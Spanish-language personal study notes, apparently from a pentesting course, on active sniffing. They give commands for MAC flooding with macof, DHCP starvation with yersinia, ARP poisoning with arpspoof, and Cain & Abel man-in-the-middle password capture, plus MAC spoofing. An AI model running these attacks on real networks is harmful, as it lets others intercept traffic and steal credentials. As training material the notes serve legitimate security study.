# Sniffing activo 

Tags: #Hacking #Sniffing #MACFlooding #DHCPStarvation 

## Macof 

```bash 
# Kali Tool 
❯ wireshark &       # Para snifear el tráfico en la interface 

❯ macof -I eth0 -d IP -n 10      # Genera tráfico ARP falso haciendo un 'flooding' de la tabla CAM para hacer que un 'Switch' pase a modo 'Hub' y transmita todo el tráfico en todos los puertos

	# I = Interface 
	# d = IP de destino 
	# n = Numero de paquetes a enviar 
```

## Yersenia 

```bash 
# 'DHCP Starvation' y sirve para consumir todas las direcciones IP disponibles desntro del scope del DHCP  

# Kali Tool 
❯ wireshark &       # Snifear el tráfico del ataque al protocolo DHCP, donde se encontra la transacción del ID

❯ yersenia -I    

	# I = Modo interactivo 

Nota: 
	1. 'h' muestra la ayuda y como aplicar los comandos 
	2. 'q' Salir del menú de ayuda 
	3. 'F2' para seleccionar el modo 'DHCP Fields'
		1. 'x' para listar los tipos de ataques 
		2. '1' para enviar un paquete de descubrimiento 
		3. 'q' para frenar el ataque 
```

## Arpspoof

```bash 
# Kali Tool 
❯ wireshark &     # Para snifear el tráfico en la interface 

❯ arpspoof -i eth0 -t IP_Gateway IP     # Para hacer 'ARP poisoning'

	# i = Interface 
	# t = IP del gateway a impersonar - IP víctima. Esto con el fin de decir que la maquina Kali es el Gateway 

❯ arpspoof -i eth0 -t IP IP_Gateway     # El ataque se hará de la manera contraria donde se impersonará la IP de la máquina víctima 
```

## Cain & Abel 

```bash 
# Windows Tool 
❯ cain.exe          # Ejecutamos el programa para snifear el tráfico y obtener claves 

Nota:
	1. En 'Configure' se puede ocnfigurar el adaptador de red 
	2. Se puede 'Start/Stop' el sniffer con el icono 
	3. Seleccionar la pestaña de 'Sniffer'
	4. En el icono de '+' se puede agregar la opción para que se detecten todas las máquinas de la red 
	5. En la pestaña de 'APR' hacer click en la tabla blanca para activar el icono '+' y poder seleccionar las máquinas para poder hacer 'man-in-the-middle'
	6. Escoger la IP a atacar
	7. Para activar el ataque dar click en el icono 'Start/Stop APR'
	8. En 'Passwords' se puede obtener las contraseñas de los diferentes protocolos 


# Windows
❯ ftp IP      # Desde la máquina víctima hacer una conexión FTP
```

## TMAC and SMAC 

```bash 
# Windows Tool 
❯ TMACv6.exe      # Ejecutamos el programa para falsificar una dirección MAC

Nota:
	1. Seleccionar el adaptador de red 
	2. Hacer click en el botón de 'Random MAC Address' y despues dar click en 'Change now!'
	3. El botón de 'Restore Original' restaurará la MAC a la original 
```

## Macchanger

```bash 
# Kali Tool 
❯ ifconfig eth0 down        # Desactivar la tarjeta de red 

❯ macchanger -s eth0        # Mirar la MAC actual 
❯ macchanger -r eth0        # Colocar una MAC aleatoria 

❯ ifconfig eth0 up          # Activar la tarjeta de red 
```